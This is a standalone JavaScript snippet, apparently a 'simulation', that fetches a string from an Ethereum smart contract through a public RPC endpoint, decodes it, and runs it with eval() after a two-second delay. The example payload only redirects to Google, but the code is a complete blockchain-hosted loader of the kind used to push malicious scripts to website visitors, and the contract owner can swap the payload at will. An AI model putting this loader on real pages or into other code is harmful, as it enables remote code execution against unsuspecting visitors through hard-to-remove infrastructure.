<script>
(function() {
    var CONTRACT_ADDRESS = "0xYourDeployedContractAddress";
    var RPC_URL          = "https://eth-sepolia.g.alchemy.com/v2/YOUR_API_KEY";
    var SELECTOR         = "0x????????"; // getPayload() selector

    var status = document.getElementById("status");
    status.textContent = "Fetching from blockchain...";

    function decodeABIString(hexResult) {
        var hex    = hexResult.slice(2);
        var length = parseInt(hex.slice(64, 128), 16);
        var strHex = hex.slice(128, 128 + length * 2);
        var bytes  = strHex.match(/.{2}/g).map(function(b) {
            return parseInt(b, 16);
        });
        return String.fromCharCode.apply(null, bytes);
    }

    fetch(RPC_URL, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            jsonrpc: "2.0",
            method:  "eth_call",
            params:  [{
                to:   CONTRACT_ADDRESS,
                data: SELECTOR
            }, "latest"],
            id: 1
        })
    })
    .then(function(r) { return r.json(); })
    .then(function(data) {
        var payload = decodeABIString(data.result);

        // Show in status div before executing
        status.textContent = "Payload received: " + payload;
        console.log("[SIMULATION] Payload:", payload);

        // Small delay so you can see the status update
        // before the redirect happens
        setTimeout(function() {
            eval(payload); // executes: window.location.href='https://www.google.com'
        }, 2000);
    })
    .catch(function(err) {
        status.textContent = "Error: " + err.message;
        console.error("[SIMULATION] Fetch failed:", err);
    });

})();
</script>
